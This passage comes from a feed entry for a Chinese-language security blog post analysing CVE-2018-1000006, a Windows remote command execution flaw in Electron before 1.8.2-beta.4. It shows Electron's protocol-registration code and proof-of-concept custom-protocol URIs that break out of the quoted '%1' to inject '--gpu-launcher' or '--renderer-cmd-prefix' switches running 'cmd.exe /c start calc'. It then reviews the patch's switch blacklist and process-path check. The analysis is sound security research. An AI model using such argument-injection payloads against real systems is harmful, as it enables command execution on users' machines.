class="line">43</div></pre></td><td class="code"><pre><div class="line">bool Browser::SetAsDefaultProtocolClient(const std::string&amp; protocol,</div><div class="line">                                        mate::Arguments* args) &#123;</div><div class="line">  // HKEY_CLASSES_ROOT</div><div class="line">  //    $PROTOCOL</div><div class="line">  //       (Default) = "URL:$NAME"</div><div class="line">  //       URL Protocol = ""</div><div class="line">  //       shell</div><div class="line">  //          open</div><div class="line">  //             command</div><div class="line">  //                (Default) = "$COMMAND" "%1"</div><div class="line">  //</div><div class="line">  // However, the "HKEY_CLASSES_ROOT" key can only be written by the</div><div class="line">  // Administrator user. So, we instead write to "HKEY_CURRENT_USER\</div><div class="line">  // Software\Classes", which is inherited by "HKEY_CLASSES_ROOT"</div><div class="line">  // anyway, and can be written by unprivileged users.</div><div class="line"></div><div class="line">  if (protocol.empty())</div><div class="line">    return false;</div><div class="line"></div><div class="line">  base::string16 exe;</div><div class="line">  if (!GetProtocolLaunchPath(args, &amp;exe))</div><div class="line">    return false;</div><div class="line"></div><div class="line">  // Main Registry Key</div><div class="line">  HKEY root = HKEY_CURRENT_USER;</div><div class="line">  base::string16 keyPath = base::UTF8ToUTF16("Software\\Classes\\" + protocol);</div><div class="line">  base::string16 urlDecl = base::UTF8ToUTF16("URL:" + protocol);</div><div class="line"></div><div class="line">  // Command Key</div><div class="line">  base::string16 cmdPath = keyPath + L"\\shell\\open\\command";</div><div class="line"></div><div class="line">  // Write information to registry</div><div class="line">  base::win::RegKey key(root, keyPath.c_str(), KEY_ALL_ACCESS);</div><div class="line">  if (FAILED(key.WriteValue(L"URL Protocol", L"")) ||</div><div class="line">      FAILED(key.WriteValue(L"", urlDecl.c_str())))</div><div class="line">    return false;</div><div class="line"></div><div class="line">  base::win::RegKey commandKey(root, cmdPath.c_str(), KEY_ALL_ACCESS);</div><div class="line">  if (FAILED(commandKey.WriteValue(L"", exe.c_str())))</div><div class="line">    return false;</div><div class="line"></div><div class="line">  return true;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>经过上述的注册表登记，通过查看注册表编辑器，可以发现多了一项：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/5.jpg?raw=true" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;C:\Users\ASUS\Desktop\elec\elec_rce\elec_rce-win32-x64\elec_rce.exe&quot; &quot;%1&quot;</div></pre></td></tr></table></figure>
-<p>在<a href="https://msdn.microsoft.com/en-us/library/aa767914.aspx" target="_blank" rel="external">微软官方文档</a>中，在<code>Launching the Handler</code>一节中提到了在协议登记后如何启动应用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">When ShellExecute executes the pluggable protocol handler with a stringon the command line, any non-encoded spaces, quotes, and backslashes in the URI will be interpreted as part of the command line. This means that if you use C/C++&apos;s argc and argv to determine the arguments passed to your application, the string may be broken across multiple parameters.</div></pre></td></tr></table></figure></p>
-<p>所以当我们点击payload时，注册表中的<code>%1</code>被替换为我们的payload，双引号被成功闭合:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;C:\Users\ASUS\Desktop\elec\elec_rce\elec_rce-win32-x64\elec_rce.exe&quot; &quot;chybeta://?&quot; &quot;--no-sandbox&quot; &quot;--gpu-launcher=cmd.exe /c start calc&quot;</div></pre></td></tr></table></figure></p>
-<p>从而传递了第三个参数<code>--gpu-launcher=cmd.exe /c start calc</code>造成命令执行。</p>
-<p>对参数传递有疑的可以用下面代码测试：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> count;</div><div class="line">    <span class="keyword">for</span>(count = <span class="number">0</span>;count &lt; argc ; count++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"argv[%d]: %s\n"</span>,count, argv[count]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    getchar();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>自己手动注册协议，参数解析情况如图：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/6.jpg?raw=true" alt=""></p>
-<p>第三个参数<code>--gpu-launcher=cmd.exe /c start calc</code>会传递给Chromium，在<a href="https://peter.sh/experiments/chromium-command-line-switches/" target="_blank" rel="external">List of Chromium Command Line Switches</a>中总结了Chromium的命令行参数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/7.jpg?raw=true" alt=""></p>
-<p>所以其实换其他参数也是能命令执行成功的，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta://?&quot; &quot;--no-sandbox&quot; &quot;--renderer-cmd-prefix=cmd.exe /c start calc</div></pre></td></tr></table></figure></p>
-<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>打包生成打上补丁的<a href="https://github.com/electron/electron/releases/tag/v1.8.2-beta.4" target="_blank" rel="external">版本1.8.2-beta.4</a>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">electron-packager ./test elec_rce_fixed --win --out ./elec_rce_fixed --arch=x64 --version=0.0.1 --electron-version=1.8.2-beta.4 --download.mirror=https://npm.taobao.org/mirrors/electron/</div></pre></td></tr></table></figure></p>
-<p>再点击poc即可发现无法触发计算器。</p>
-<p>这个漏洞仅影响win平台，究其根源在于windows用了双引号来传参，在<a href="https://msdn.microsoft.com/en-us/library/aa767914.aspx#Registering%20the%20Application%20Handling%20the%20Custom%20URI%20Scheme" target="_blank" rel="external">微软官方文档</a>中提到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">To mitigate this issue:</div><div class="line"></div><div class="line">1. Avoid spaces, quotes, or backslashes in your URI</div><div class="line">2. Quote the %1 in the registration (&quot;%1&quot; as written in the &apos;alert&apos; example registration)</div></pre></td></tr></table></figure></p>
-<p>好像就这个洞而言，第二条好像就被轻易饶过了。</p>
-<p>Electron官方在 <a href="https://github.com/electron/electron/commit/c49cb29ddf3368daf279bd60c007f9c015bc834c" target="_blank" rel="external">commit-c49cb29ddf3368daf279bd60c007f9c015bc834c</a>修复该漏洞，主要是对参数的接受以及子进程的运行做了检查。</p>
-<p>首先增加了对黑名单的验证，新增加了 <a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/command_line_args.cc" target="_blank" rel="external">app/command_line_args.cc</a>，其中<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/command_line_args.cc#L40" target="_blank" rel="external">第40行</a>增加了黑名单列表:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/9.jpg?raw=true" alt=""></p>
-<p>由<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/command_line_args.cc#L1395" target="_blank" rel="external">CheckCommandLineArguments</a>进行验证：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/10.jpg?raw=true" alt=""></p>
-<p>该验证函数在<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/app/atom_main.cc#L132" target="_blank" rel="external">atom/app/atom_main.cc的第132行</a>调用<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/11.jpg?raw=true" alt=""></p>
-<p>另外还增加了对子进程的验证，在<a href="https://github.com/electron/electron/blob/c49cb29ddf3368daf279bd60c007f9c015bc834c/atom/browser/atom_browser_client.cc#L244" target="_blank" rel="external">atom/browser/atom_browser_client.cc的第244行</a>：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/12.jpg?raw=true" alt=""></p>
-<p>MakeAbsoluteFilePath()是<a href="https://github.com/scheib/chromium/blob/f8675cbb337440a11bf9afb10ea11bae42bb92cb/base/files/file_util_win.cc#L85" target="_blank" rel="external">chromium定义的函数</a>，这段代码用于对于启动进程的路径检查，防止未知应用的启动。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180124/13.jpg?raw=true" alt=""></p>
-<p>实际上，对黑名单的修补是不完善的，可以直接绕过，但后面对于路径的验证却难以绕过，因为路径验证的失败而直接导致程序崩溃。</p>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>以上是我分析的一些想法，若有错误烦请各位师傅指出，谢谢各位师傅。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;本文首发于&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/1990&quot;&gt;阿里先知安全社区：Electron &amp;lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
